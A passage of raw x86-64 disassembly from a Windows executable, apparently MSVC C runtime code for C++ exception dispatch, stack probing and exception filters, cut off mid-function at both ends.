   14000c05d:	00 
   14000c05e:	0f 85 5d 01 00 00    	jne    0x14000c1c1
   14000c064:	83 e0 20             	and    $0x20,%eax
   14000c067:	74 3f                	je     0x14000c0a8
   14000c069:	44 39 0b             	cmp    %r9d,(%rbx)
   14000c06c:	75 3a                	jne    0x14000c0a8
   14000c06e:	4d 8b 84 24 f8 00 00 	mov    0xf8(%r12),%r8
   14000c075:	00 
   14000c076:	48 8b d5             	mov    %rbp,%rdx
   14000c079:	48 8b cf             	mov    %rdi,%rcx
   14000c07c:	e8 db eb ff ff       	call   0x14000ac5c
   14000c081:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000c084:	8b d8                	mov    %eax,%ebx
   14000c086:	7c 05                	jl     0x14000c08d
   14000c088:	3b 47 04             	cmp    0x4(%rdi),%eax
   14000c08b:	7c 05                	jl     0x14000c092
   14000c08d:	e8 5a 7f ff ff       	call   0x140003fec
   14000c092:	44 8b cb             	mov    %ebx,%r9d
   14000c095:	48 8b ce             	mov    %rsi,%rcx
   14000c098:	48 8b d5             	mov    %rbp,%rdx
   14000c09b:	4c 8b c7             	mov    %rdi,%r8
   14000c09e:	e8 a5 ee ff ff       	call   0x14000af48
   14000c0a3:	e9 19 01 00 00       	jmp    0x14000c1c1
   14000c0a8:	85 c0                	test   %eax,%eax
   14000c0aa:	74 20                	je     0x14000c0cc
   14000c0ac:	44 39 03             	cmp    %r8d,(%rbx)
   14000c0af:	75 1b                	jne    0x14000c0cc
   14000c0b1:	8b 73 38             	mov    0x38(%rbx),%esi
   14000c0b4:	83 fe ff             	cmp    $0xffffffff,%esi
   14000c0b7:	7c 05                	jl     0x14000c0be
   14000c0b9:	3b 77 04             	cmp    0x4(%rdi),%esi
   14000c0bc:	7c 05                	jl     0x14000c0c3
   14000c0be:	e8 29 7f ff ff       	call   0x140003fec
   14000c0c3:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000c0c7:	44 8b ce             	mov    %esi,%r9d
   14000c0ca:	eb cc                	jmp    0x14000c098
   14000c0cc:	4c 8b c7             	mov    %rdi,%r8
   14000c0cf:	48 8b d5             	mov    %rbp,%rdx
   14000c0d2:	48 8b ce             	mov    %rsi,%rcx
   14000c0d5:	e8 6e e6 ff ff       	call   0x14000a748
   14000c0da:	e9 e2 00 00 00       	jmp    0x14000c1c1
   14000c0df:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   14000c0e3:	75 2e                	jne    0x14000c113
   14000c0e5:	8b 07                	mov    (%rdi),%eax
   14000c0e7:	23 c2                	and    %edx,%eax
   14000c0e9:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   14000c0ee:	0f 82 cd 00 00 00    	jb     0x14000c1c1
   14000c0f4:	83 7f 20 00          	cmpl   $0x0,0x20(%rdi)
   14000c0f8:	74 0e                	je     0x14000c108
   14000c0fa:	e8 e1 e5 ff ff       	call   0x14000a6e0
   14000c0ff:	48 63 4f 20          	movslq 0x20(%rdi),%rcx
   14000c103:	48 03 c1             	add    %rcx,%rax
   14000c106:	eb 02                	jmp    0x14000c10a
   14000c108:	33 c0                	xor    %eax,%eax
   14000c10a:	48 85 c0             	test   %rax,%rax
   14000c10d:	0f 84 ae 00 00 00    	je     0x14000c1c1
   14000c113:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000c119:	75 6d                	jne    0x14000c188
   14000c11b:	83 7b 18 03          	cmpl   $0x3,0x18(%rbx)
   14000c11f:	72 67                	jb     0x14000c188
   14000c121:	81 7b 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rbx)
   14000c128:	76 5e                	jbe    0x14000c188
   14000c12a:	48 8b 43 30          	mov    0x30(%rbx),%rax
   14000c12e:	83 78 08 00          	cmpl   $0x0,0x8(%rax)
   14000c132:	74 12                	je     0x14000c146
   14000c134:	e8 bf e5 ff ff       	call   0x14000a6f8
   14000c139:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000c13d:	4c 63 59 08          	movslq 0x8(%rcx),%r11
   14000c141:	4c 03 d8             	add    %rax,%r11
   14000c144:	eb 03                	jmp    0x14000c149
   14000c146:	45 33 db             	xor    %r11d,%r11d
   14000c149:	4d 85 db             	test   %r11,%r11
   14000c14c:	74 3a                	je     0x14000c188
   14000c14e:	0f b6 84 24 98 00 00 	movzbl 0x98(%rsp),%eax
   14000c155:	00 
   14000c156:	4c 8b cd             	mov    %rbp,%r9
   14000c159:	4d 8b c4             	mov    %r12,%r8
   14000c15c:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000c160:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   14000c167:	00 
   14000c168:	48 8b d6             	mov    %rsi,%rdx
   14000c16b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000c170:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   14000c177:	48 8b cb             	mov    %rbx,%rcx
   14000c17a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000c17e:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000c183:	41 ff d3             	call   *%r11
   14000c186:	eb 3c                	jmp    0x14000c1c4
   14000c188:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   14000c18f:	00 
   14000c190:	4c 8b cd             	mov    %rbp,%r9
   14000c193:	4d 8b c4             	mov    %r12,%r8
   14000c196:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000c19b:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   14000c1a2:	48 8b d6             	mov    %rsi,%rdx
   14000c1a5:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000c1a9:	8a 84 24 98 00 00 00 	mov    0x98(%rsp),%al
   14000c1b0:	48 8b cb             	mov    %rbx,%rcx
   14000c1b3:	88 44 24 28          	mov    %al,0x28(%rsp)
   14000c1b7:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000c1bc:	e8 77 f8 ff ff       	call   0x14000ba38
   14000c1c1:	41 8b c6             	mov    %r14d,%eax
   14000c1c4:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000c1c9:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   14000c1ce:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   14000c1d3:	48 83 c4 40          	add    $0x40,%rsp
   14000c1d7:	41 5e                	pop    %r14
   14000c1d9:	41 5c                	pop    %r12
   14000c1db:	5f                   	pop    %rdi
   14000c1dc:	c3                   	ret
   14000c1dd:	cc                   	int3
   14000c1de:	cc                   	int3
   14000c1df:	cc                   	int3
   14000c1e0:	48 8b 04 24          	mov    (%rsp),%rax
   14000c1e4:	48 89 01             	mov    %rax,(%rcx)
   14000c1e7:	c3                   	ret
   14000c1e8:	48 f7 d9             	neg    %rcx
   14000c1eb:	1b c0                	sbb    %eax,%eax
   14000c1ed:	83 e0 01             	and    $0x1,%eax
   14000c1f0:	c3                   	ret
   14000c1f1:	cc                   	int3
   14000c1f2:	cc                   	int3
   14000c1f3:	cc                   	int3
   14000c1f4:	48 8b c4             	mov    %rsp,%rax
   14000c1f7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000c1fb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000c1ff:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000c203:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000c207:	41 54                	push   %r12
   14000c209:	48 83 ec 20          	sub    $0x20,%rsp
   14000c20d:	49 8b 59 38          	mov    0x38(%r9),%rbx
   14000c211:	48 8b f2             	mov    %rdx,%rsi
   14000c214:	4d 8b e0             	mov    %r8,%r12
   14000c217:	48 8b e9             	mov    %rcx,%rbp
   14000c21a:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   14000c21e:	49 8b d1             	mov    %r9,%rdx
   14000c221:	48 8b ce             	mov    %rsi,%rcx
   14000c224:	49 8b f9             	mov    %r9,%rdi
   14000c227:	e8 18 ae ff ff       	call   0x140007044
   14000c22c:	44 8b 5b 04          	mov    0x4(%rbx),%r11d
   14000c230:	44 8b 55 04          	mov    0x4(%rbp),%r10d
   14000c234:	41 8b c3             	mov    %r11d,%eax
   14000c237:	41 83 e3 02          	and    $0x2,%r11d
   14000c23b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000c241:	41 23 c0             	and    %r8d,%eax
   14000c244:	41 80 e2 66          	and    $0x66,%r10b
   14000c248:	44 0f 44 d8          	cmove  %eax,%r11d
   14000c24c:	45 85 db             	test   %r11d,%r11d
   14000c24f:	74 14                	je     0x14000c265
   14000c251:	4c 8b cf             	mov    %rdi,%r9
   14000c254:	4d 8b c4             	mov    %r12,%r8
   14000c257:	48 8b d6             	mov    %rsi,%rdx
   14000c25a:	48 8b cd             	mov    %rbp,%rcx
   14000c25d:	e8 92 e5 ff ff       	call   0x14000a7f4
   14000c262:	44 8b c0             	mov    %eax,%r8d
   14000c265:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c26a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000c26f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000c274:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000c279:	41 8b c0             	mov    %r8d,%eax
   14000c27c:	48 83 c4 20          	add    $0x20,%rsp
   14000c280:	41 5c                	pop    %r12
   14000c282:	c3                   	ret
   14000c283:	cc                   	int3
   14000c284:	cc                   	int3
   14000c285:	cc                   	int3
   14000c286:	cc                   	int3
   14000c287:	cc                   	int3
   14000c288:	cc                   	int3
   14000c289:	cc                   	int3
   14000c28a:	cc                   	int3
   14000c28b:	cc                   	int3
   14000c28c:	cc                   	int3
   14000c28d:	cc                   	int3
   14000c28e:	cc                   	int3
   14000c28f:	cc                   	int3
   14000c290:	cc                   	int3
   14000c291:	cc                   	int3
   14000c292:	cc                   	int3
   14000c293:	cc                   	int3
   14000c294:	cc                   	int3
   14000c295:	cc                   	int3
   14000c296:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000c29d:	00 00 00 
   14000c2a0:	48 83 ec 10          	sub    $0x10,%rsp
   14000c2a4:	4c 89 14 24          	mov    %r10,(%rsp)
   14000c2a8:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000c2ad:	4d 33 db             	xor    %r11,%r11
   14000c2b0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   14000c2b5:	4c 2b d0             	sub    %rax,%r10
   14000c2b8:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000c2bc:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   14000c2c3:	00 00 
   14000c2c5:	4d 3b d3             	cmp    %r11,%r10
   14000c2c8:	73 16                	jae    0x14000c2e0
   14000c2ca:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   14000c2d0:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   14000c2d7:	41 c6 03 00          	movb   $0x0,(%r11)
   14000c2db:	4d 3b d3             	cmp    %r11,%r10
   14000c2de:	75 f0                	jne    0x14000c2d0
   14000c2e0:	4c 8b 14 24          	mov    (%rsp),%r10
   14000c2e4:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   14000c2e9:	48 83 c4 10          	add    $0x10,%rsp
   14000c2ed:	c3                   	ret
   14000c2ee:	cc                   	int3
   14000c2ef:	cc                   	int3
   14000c2f0:	cc                   	int3
   14000c2f1:	cc                   	int3
   14000c2f2:	cc                   	int3
   14000c2f3:	cc                   	int3
   14000c2f4:	cc                   	int3
   14000c2f5:	cc                   	int3
   14000c2f6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000c2fd:	00 00 00 
   14000c300:	48 83 ec 28          	sub    $0x28,%rsp
   14000c304:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000c309:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000c30e:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   14000c313:	48 8b 12             	mov    (%rdx),%rdx
   14000c316:	48 8b c1             	mov    %rcx,%rax
   14000c319:	e8 f2 9a ff ff       	call   0x140005e10
   14000c31e:	ff d0                	call   *%rax
   14000c320:	e8 1b 9b ff ff       	call   0x140005e40
   14000c325:	48 8b c8             	mov    %rax,%rcx
   14000c328:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000c32d:	48 8b 12             	mov    (%rdx),%rdx
   14000c330:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000c336:	e8 d5 9a ff ff       	call   0x140005e10
   14000c33b:	48 83 c4 28          	add    $0x28,%rsp
   14000c33f:	c3                   	ret
   14000c340:	40 55                	rex push %rbp
   14000c342:	48 83 ec 20          	sub    $0x20,%rsp
   14000c346:	48 8b ea             	mov    %rdx,%rbp
   14000c349:	83 bd 80 00 00 00 00 	cmpl   $0x0,0x80(%rbp)
   14000c350:	74 0a                	je     0x14000c35c
   14000c352:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000c357:	e8 10 78 ff ff       	call   0x140003b6c
   14000c35c:	48 83 c4 20          	add    $0x20,%rsp
   14000c360:	5d                   	pop    %rbp
   14000c361:	c3                   	ret
   14000c362:	40 55                	rex push %rbp
   14000c364:	48 83 ec 20          	sub    $0x20,%rsp
   14000c368:	48 8b ea             	mov    %rdx,%rbp
   14000c36b:	48 8b 01             	mov    (%rcx),%rax
   14000c36e:	48 8b d1             	mov    %rcx,%rdx
   14000c371:	8b 08                	mov    (%rax),%ecx
   14000c373:	e8 b8 7c ff ff       	call   0x140004030
   14000c378:	48 83 c4 20          	add    $0x20,%rsp
   14000c37c:	5d                   	pop    %rbp
   14000c37d:	c3                   	ret
   14000c37e:	40 55                	rex push %rbp
   14000c380:	48 83 ec 20          	sub    $0x20,%rsp
   14000c384:	48 8b ea             	mov    %rdx,%rbp
   14000c387:	b9 0e 00 00 00       	mov    $0xe,%ecx
   14000c38c:	e8 db 77 ff ff       	call   0x140003b6c
   14000c391:	48 83 c4 20          	add    $0x20,%rsp
   14000c395:	5d                   	pop    %rbp
   14000c396:	c3                   	ret
   14000c397:	40 55                	rex push %rbp
   14000c399:	48 83 ec 20          	sub    $0x20,%rsp
   14000c39d:	48 8b ea             	mov    %rdx,%rbp
   14000c3a0:	e8 6f 5c ff ff       	call   0x140002014
   14000c3a5:	48 83 c4 20          	add    $0x20,%rsp
   14000c3a9:	5d                   	pop    %rbp
   14000c3aa:	c3                   	ret
   14000c3ab:	40 55                	rex push %rbp
   14000c3ad:	48 83 ec 20          	sub    $0x20,%rsp
   14000c3b1:	48 8b ea             	mov    %rdx,%rbp
   14000c3b4:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000c3b9:	e8 ae 77 ff ff       	call   0x140003b6c
   14000c3be:	48 83 c4 20          	add    $0x20,%rsp
   14000c3c2:	5d                   	pop    %rbp
   14000c3c3:	c3                   	ret
   14000c3c4:	cc                   	int3
   14000c3c5:	cc                   	int3
   14000c3c6:	cc                   	int3
   14000c3c7:	cc                   	int3
   14000c3c8:	cc                   	int3
   14000c3c9:	cc                   	int3
   14000c3ca:	cc                   	int3
   14000c3cb:	40 55                	rex push %rbp
   14000c3cd:	48 83 ec 20          	sub    $0x20,%rsp
   14000c3d1:	48 8b ea             	mov    %rdx,%rbp
   14000c3d4:	b9 0c 00 00 00       	mov    $0xc,%ecx
   14000c3d9:	e8 8e 77 ff ff       	call   0x140003b6c
   14000c3de:	48 83 c4 20          	add    $0x20,%rsp
   14000c3e2:	5d                   	pop    %rbp
   14000c3e3:	c3                   	ret
   14000c3e4:	40 55                	rex push %rbp
   14000c3e6:	48 83 ec 20          	sub    $0x20,%rsp
   14000c3ea:	48 8b ea             	mov    %rdx,%rbp
   14000c3ed:	48 8b 0d 0c 70 00 00 	mov    0x700c(%rip),%rcx        # 0x140013400
   14000c3f4:	ff 15 c6 1d 00 00    	call   *0x1dc6(%rip)        # 0x14000e1c0
   14000c3fa:	48 83 c4 20          	add    $0x20,%rsp
   14000c3fe:	5d                   	pop    %rbp
   14000c3ff:	c3                   	ret
   14000c400:	40 55                	rex push %rbp
   14000c402:	48 83 ec 20          	sub    $0x20,%rsp
   14000c406:	48 8b ea             	mov    %rdx,%rbp
   14000c409:	48 8b 01             	mov    (%rcx),%rax
   14000c40c:	33 c9                	xor    %ecx,%ecx
   14000c40e:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000c414:	0f 94 c1             	sete   %cl
   14000c417:	8b c1                	mov    %ecx,%eax
   14000c419:	8b c1                	mov    %ecx,%eax
   14000c41b:	48 83 c4 20          	add    $0x20,%rsp
   14000c41f:	5d                   	pop    %rbp
   14000c420:	c3                   	ret
   14000c421:	40 55                	rex push %rbp
   14000c423:	48 83 ec 30          	sub    $0x30,%rsp
   14000c427:	48 8b ea             	mov    %rdx,%rbp
   14000c42a:	83 7d 70 00          	cmpl   $0x0,0x70(%rbp)
   14000c42e:	74 07                	je     0x14000c437
   14000c430:	33 c9                	xor    %ecx,%ecx
   14000c432:	e8 35 77 ff ff       	call   0x140003b6c
   14000c437:	48 83 c4 30          	add    $0x30,%rsp
   14000c43b:	5d                   	pop    %rbp
   14000c43c:	c3                   	ret
   14000c43d:	40 55                	rex push %rbp
   14000c43f:	48 83 ec 20          	sub    $0x20,%rsp
   14000c443:	48 8b ea             	mov    %rdx,%rbp
   14000c446:	48 8b 01             	mov    (%rcx),%rax
   14000c449:	45 33 db             	xor    %r11d,%r11d
   14000c44c:	81 38 17 00 00 c0    	cmpl   $0xc0000017,(%rax)
   14000c452:	41 0f 94 c3          	sete   %r11b
   14000c456:	41 8b c3             	mov    %r11d,%eax
   14000c459:	48 83 c4 20          	add    $0x20,%rsp
   14000c45d:	5d                   	pop    %rbp
   14000c45e:	c3                   	ret
   14000c45f:	40 55                	rex push %rbp
   14000c461:	48 83 ec 20          	sub    $0x20,%rsp
   14000c465:	48 8b ea             	mov    %rdx,%rbp
   14000c468:	b9 0c 00 00 00       	mov    $0xc,%ecx
   14000c46d:	e8 fa 76 ff ff       	call   0x140003b6c
   14000c472:	48 83 c4 20          	add    $0x20,%rsp
   14000c476:	5d                   	pop    %rbp
   14000c477:	c3                   	ret
   14000c478:	40 55                	rex push %rbp
   14000c47a:	48 83 ec 20          	sub    $0x20,%rsp
   14000c47e:	48 8b ea             	mov    %rdx,%rbp
   14000c481:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000c486:	e8 e1 76 ff ff       	call   0x140003b6c
   14000c48b:	48 83 c4 20          	add    $0x20,%rsp
   14000c48f:	5d                   	pop    %rbp
   14000c490:	c3                   	ret
   14000c491:	40 55                	rex push %rbp
   14000c493:	48 83 ec 30          	sub    $0x30,%rsp
   14000c497:	48 8b ea             	mov    %rdx,%rbp
   14000c49a:	8b 4d 60             	mov    0x60(%rbp),%ecx
   14000c49d:	e8 76 d1 ff ff       	call   0x140009618
   14000c4a2:	48 83 c4 30          	add    $0x30,%rsp
   14000c4a6:	5d                   	pop    %rbp
   14000c4a7:	c3                   	ret
   14000c4a8:	40 55                	rex push %rbp
   14000c4aa:	48 83 ec 20          	sub    $0x20,%rsp
   14000c4ae:	48 8b ea             	mov    %rdx,%rbp
   14000c4b1:	b9 0a 00 00 00       	mov    $0xa,%ecx
   14000c4b6:	e8 b1 76 ff ff       	call   0x140003b6c
   14000c4bb:	48 83 c4 20          	add    $0x20,%rsp
   14000c4bf:	5d                   	pop    %rbp
   14000c4c0:	c3                   	ret
   14000c4c1:	40 55                	rex push %rbp
   14000c4c3:	48 83 ec 20          	sub    $0x20,%rsp
   14000c4c7:	48 8b ea             	mov    %rdx,%rbp
   14000c4ca:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000c4cf:	e8 98 76 ff ff       	call   0x140003b6c
   14000c4d4:	48 83 c4 20          	add    $0x20,%rsp
   14000c4d8:	5d                   	pop    %rbp
   14000c4d9:	c3                   	ret
   14000c4da:	40 55                	rex push %rbp
   14000c4dc:	48 83 ec 20          	sub    $0x20,%rsp
   14000c4e0:	48 8b ea             	mov    %rdx,%rbp
   14000c4e3:	48 63 4d 20          	movslq 0x20(%rbp),%rcx
   14000c4e7:	48 8b c1             	mov    %rcx,%rax
   14000c4ea:	48 8b 15 4f 90 00 00 	mov    0x904f(%rip),%rdx        # 0x140015540
   14000c4f1:	48 8b 14 ca          	mov    (%rdx,%rcx,8),%rdx
   14000c4f5:	e8 f2 b8 ff ff       	call   0x140007dec
   14000c4fa:	48 83 c4 20          	add    $0x20,%rsp
   14000c4fe:	5d                   	pop    %rbp
   14000c4ff:	c3                   	ret
   14000c500:	cc                   	int3
   14000c501:	cc                   	int3
   14000c502:	cc                   	int3
   14000c503:	cc                   	int3
   14000c504:	cc                   	int3
   14000c505:	cc                   	int3
   14000c506:	cc                   	int3
   14000c507:	cc                   	int3
   14000c508:	cc                   	int3
   14000c509:	cc                   	int3
   14000c50a:	40 55                	rex push %rbp
   14000c50c:	48 83 ec 20          	sub    $0x20,%rsp
   14000c510:	48 8b ea             	mov    %rdx,%rbp
   14000c513:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000c518:	e8 4f 76 ff ff       	call   0x140003b6c
   14000c51d:	48 83 c4 20          	add    $0x20,%rsp
   14000c521:	5d                   	pop    %rbp
   14000c522:	c3                   	ret
   14000c523:	40 55                	rex push %rbp
   14000c525:	48 83 ec 30          	sub    $0x30,%rsp
   14000c529:	48 8b ea             	mov    %rdx,%rbp
   14000c52c:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   14000c530:	e8 5f b8 ff ff       	call   0x140007d94
   14000c535:	48 83 c4 30          	add    $0x30,%rsp
   14000c539:	5d                   	pop    %rbp
   14000c53a:	c3                   	ret
   14000c53b:	40 55                	rex push %rbp
   14000c53d:	48 83 ec 30          	sub    $0x30,%rsp
   14000c541:	48 8b ea             	mov    %rdx,%rbp
   14000c544:	8b 4d 50             	mov    0x50(%rbp),%ecx
   14000c547:	e8 cc d0 ff ff       	call   0x140009618
   14000c54c:	48 83 c4 30          	add    $0x30,%rsp
   14000c550:	5d                   	pop    %rbp
   14000c551:	c3                   	ret
   14000c552:	40 55                	rex push %rbp
   14000c554:	48 83 ec 20          	sub    $0x20,%rsp
   14000c558:	48 8b ea             	mov    %rdx,%rbp
   14000c55b:	48 8d 4d 28          	lea    0x28(%rbp),%rcx
   14000c55f:	e8 ac 4c ff ff       	call   0x140001210
   14000c564:	48 83 c4 20          	add    $0x20,%rsp
   14000c568:	5d                   	pop    %rbp
   14000c569:	c3                   	ret
   14000c56a:	cc                   	int3
   14000c56b:	cc                   	int3
   14000c56c:	cc                   	int3
   14000c56d:	cc                   	int3
   14000c56e:	cc                   	int3
   14000c56f:	cc                   	int3
   14000c570:	cc                   	int3
   14000c571:	cc                   	int3
   14000c572:	40 55                	rex push %rbp
   14000c574:	48 83 ec 20          	sub    $0x20,%rsp
   14000c578:	48 8b ea             	mov    %rdx,%rbp
   14000c57b:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   14000c57f:	e8 04 56 ff ff       	call   0x140001b88
   14000c584:	48 83 c4 20          	add    $0x20,%rsp
   14000c588:	5d                   	pop    %rbp
   14000c589:	c3                   	ret
   14000c58a:	40 55                	rex push %rbp
   14000c58c:	48 83 ec 20          	sub    $0x20,%rsp
   14000c590:	48 8b ea             	mov    %rdx,%rbp
   14000c593:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   14000c597:	e8 ec 55 ff ff       	call   0x140001b88
   14000c59c:	48 83 c4 20          	add    $0x20,%rsp
   14000c5a0:	5d                   	pop    %rbp
   14000c5a1:	c3                   	ret
   14000c5a2:	40 55                	rex push %rbp
   14000c5a4:	48 83 ec 40          	sub    $0x40,%rsp
   14000c5a8:	48 8b ea             	mov    %rdx,%rbp
   14000c5ab:	48 8d 45 40          	lea    0x40(%rbp),%rax
   14000c5af:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000c5b4:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   14000c5bb:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000c5c0:	48 8b 85 88 00 00 00 	mov    0x88(%rbp),%rax
   14000c5c7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000c5cc:	4c 8b 8d 80 00 00 00 	mov    0x80(%rbp),%r9
   14000c5d3:	4c 8b 45 78          	mov    0x78(%rbp),%r8
   14000c5d7:	48 8b 55 70          	mov    0x70(%rbp),%rdx
   14000c5db:	e8 9c e2 ff ff       	call   0x14000a87c
   14000c5e0:	48 83 c4 40          	add    $0x40,%rsp
   14000c5e4:	5d                   	pop    %rbp
   14000c5e5:	c3                   	ret
   14000c5e6:	40 55                	rex push %rbp
   14000c5e8:	48 83 ec 20          	sub    $0x20,%rsp
   14000c5ec:	48 8b ea             	mov    %rdx,%rbp
   14000c5ef:	e8 08 e9 ff ff       	call   0x14000aefc
   14000c5f4:	48 83 c4 20          	add    $0x20,%rsp
   14000c5f8:	5d                   	pop    %rbp
   14000c5f9:	c3                   	ret
   14000c5fa:	cc                   	int3
   14000c5fb:	cc                   	int3
   14000c5fc:	cc                   	int3
   14000c5fd:	cc                   	int3
   14000c5fe:	cc                   	int3
   14000c5ff:	cc                   	int3
   14000c600:	cc                   	int3
   14000c601:	cc                   	int3
   14000c602:	cc                   	int3
   14000c603:	cc                   	int3
   14000c604:	cc                   	int3
   14000c605:	cc                   	int3
   14000c606:	40 55                	rex push %rbp
   14000c608:	48 83 ec 20          	sub    $0x20,%rsp
   14000c60c:	48 8b ea             	mov    %rdx,%rbp
   14000c60f:	e8 fc 6f ff ff       	call   0x140003610
   14000c614:	83 b8 00 01 00 00 00 	cmpl   $0x0,0x100(%rax)
   14000c61b:	7e 0b                	jle    0x14000c628
   14000c61d:	e8 ee 6f ff ff       	call   0x140003610
   14000c622:	ff 88 00 01 00 00    	decl   0x100(%rax)
   14000c628:	48 83 c4 20          	add    $0x20,%rsp
   14000c62c:	5d                   	pop    %rbp
   14000c62d:	c3                   	ret
   14000c62e:	40 55                	rex push %rbp
   14000c630:	48 83 ec 20          	sub    $0x20,%rsp
   14000c634:	48 8b ea             	mov    %rdx,%rbp
   14000c637:	33 c0                	xor    %eax,%eax
   14000c639:	38 45 38             	cmp    %al,0x38(%rbp)
   14000c63c:	0f 95 c0             	setne  %al
   14000c63f:	48 83 c4 20          	add    $0x20,%rsp
   14000c643:	5d                   	pop    %rbp
   14000c644:	c3                   	ret
   14000c645:	40 55                	rex push %rbp
   14000c647:	48 83 ec 20          	sub    $0x20,%rsp
   14000c64b:	48 8b ea             	mov    %rdx,%rbp
   14000c64e:	48 89 4d 70          	mov    %rcx,0x70(%rbp)
   14000c652:	48 89 4d 68          	mov    %rcx,0x68(%rbp)
   14000c656:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000c65a:	48 8b 08             	mov    (%rax),%rcx
   14000c65d:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   14000c661:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   14000c668:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000c66c:	41 b8 63 73 6d e0    	mov    $0xe06d7363,%r8d
   14000c672:	44 39 00             	cmp    %r8d,(%rax)
   14000c675:	75 4d                	jne    0x14000c6c4
   14000c677:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000c67b:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   14000c67f:	75 43                	jne    0x14000c6c4
   14000c681:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000c685:	81 78 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rax)
   14000c68c:	74 1a                	je     0x14000c6a8
   14000c68e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000c692:	81 78 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rax)
   14000c699:	74 0d                	je     0x14000c6a8
   14000c69b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000c69f:	81 78 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rax)
   14000c6a6:	75 1c                	jne    0x14000c6c4
   14000c6a8:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   14000c6ac:	48 8b 85 d8 00 00 00 	mov    0xd8(%rbp),%rax
   14000c6b3:	48 8b 48 28          	mov    0x28(%rax),%rcx
   14000c6b7:	48 39 4a 28          	cmp    %rcx,0x28(%rdx)
   14000c6bb:	75 07                	jne    0x14000c6c4
   14000c6bd:	c7 45 20 01 00 00 00 	movl   $0x1,0x20(%rbp)
   14000c6c4:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000c6c8:	44 39 00             	cmp    %r8d,(%rax)
   14000c6cb:	75 5b                	jne    0x14000c728
   14000c6cd:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000c6d1:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   14000c6d5:	75 51                	jne    0x14000c728
   14000c6d7:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000c6db:	81 78 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rax)
   14000c6e2:	74 1a                	je     0x14000c6fe
   14000c6e4:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000c6e8:	81 78 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rax)
   14000c6ef:	74 0d                	je     0x14000c6fe
   14000c6f1:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000c6f5:	81 78 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rax)
   14000c6fc:	75 2a                	jne    0x14000c728
   14000c6fe:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000c702:	48 83 78 30 00       	cmpq   $0x0,0x30(%rax)
